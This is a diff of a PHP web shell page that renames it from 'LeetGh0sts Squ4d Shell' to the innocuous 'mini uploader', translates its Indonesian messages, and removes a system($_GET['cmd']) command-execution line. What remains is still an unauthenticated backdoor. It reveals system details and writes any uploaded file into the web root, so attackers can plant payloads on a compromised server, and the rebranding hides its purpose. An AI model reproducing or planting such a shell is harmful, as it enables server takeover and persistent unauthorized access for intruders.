@@ -2,11 +2,11 @@
 <html lang="en-US">
 <head>
 	<meta charset="UTF-8">
-	<title> .: LeetGh0sts Squ4d Shell :.</title>
+	<title> .: mini uploader :.</title>
 </head>
 <body bgcolor="black"><center>
 <font color="red"><br><br>
-<h1><font face="courier" color="white" style="text-shadow: 0px 0px 30px white;"> LeetGh0sts Squ4d </h1><br><center
+<h1><font face="courier" color="white" style="text-shadow: 0px 0px 30px white;"> mini uploader </h1><br><center
 <?php
 echo '<font color=white size=4> System: <font color=red size=5>[ <font color=lime size=3>'.php_uname().'<font color=red size=5> ]</font><br>';
 echo '<font color=white size=4>Directory: <font color=red size=5>[ <font color=lime size=3>'.getcwd().'<font color=red size=5> ]</font><br><br>';
@@ -22,9 +22,9 @@ if(isset($_POST['upload'])) {
 	if(is_writable($root)) {
 		if(@copy($_FILES['just_file']['tmp_name'], $dest)) {
 			$web = "http://".$_SERVER['HTTP_HOST']."/";
-			echo "<font color='lime'sukses upload -> <a href='$web$files' target='_blank'><b><u>$web/$files</u></b></a>";
+			echo "<font color='lime'success -> <a href='$web$files' target='_blank'><b><u>$web$files</u></b></a>";
 		} else {
-			echo "<font color='red'gagal upload di document root.";
+			echo "<font color='red' fail to upload .";
 		}
 	} else {
 		if(@copy($_FILES['just_file']['tmp_name'], $files)) {
@@ -35,7 +35,6 @@ if(isset($_POST['upload'])) {
 	}
 }
 echo '<br><br><br>';
-system($_GET['cmd']);
 ?>
 </body>
 <br>
